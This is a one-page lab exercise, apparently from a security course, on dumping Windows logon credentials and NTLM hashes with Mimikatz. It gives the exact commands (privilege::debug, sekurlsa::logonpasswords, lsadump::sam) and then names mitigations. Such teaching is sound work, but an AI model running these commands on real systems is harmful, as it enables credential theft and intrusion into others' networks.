Practical No. 14

Extraction of Windows Credentials Using Mimikatz
Aim: To extract logon credentials/hashes from a compromised Windows system using Mimikatz.
Tools / Requirements: Windows target VM, Mimikatz (run with Administrator / SYSTEM privileges), e.g. via Meterpreter
Procedure:
  1.   Obtain administrative access to the target (e.g. an elevated Meterpreter session, or local admin cmd).
  2.   Launch Mimikatz as Administrator: mimikatz.exe
  3.   Elevate debug privileges inside Mimikatz: privilege::debug
  4.   Dump logon passwords/hashes from LSASS memory: sekurlsa::logonpasswords
  5.   Dump the local SAM database hashes: lsadump::sam
  6.   Record the NTLM hashes / cleartext passwords recovered and discuss mitigation (Credential Guard, disabling
       WDigest, LAPS).
